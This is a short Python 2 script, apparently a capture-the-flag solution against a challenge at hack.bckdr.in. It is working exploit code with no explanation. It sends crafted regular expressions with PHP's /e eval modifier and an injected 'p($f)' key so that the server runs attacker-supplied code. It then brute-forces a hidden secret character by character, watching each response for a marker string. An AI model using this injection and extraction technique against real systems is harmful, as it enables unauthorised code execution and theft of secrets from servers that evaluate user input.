import requests
import sys
box = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', ' ', '!', '"', '#', '\$', '%', '&', "'", '\(', '\)', '\*', '\+', ',', '-', '\.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '\?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '\[', '\\\\', ']', '\^', '_', '`', '\{', '\|', '\}', '~']
start = '/^'
end = '[0-9a-zA-Z]*/e'

actualPassage = ''
while 1:
    flag = 1
    for i in box:
        print i,
        sys.stdout.flush()
        password = start + actualPassage + i + end
        r = requests.post("http://hack.bckdr.in/WIERD-AUTH2/submit.php", data={'password': password, 'key': 'p($f)'})
        if r.text.find('4lw4y5')!=-1:
            flag = 0
            actualPassage = actualPassage + i
            print 'yes'
            break
    if flag:
        print 'none'
        break
    print actualPassage

print actualPassage
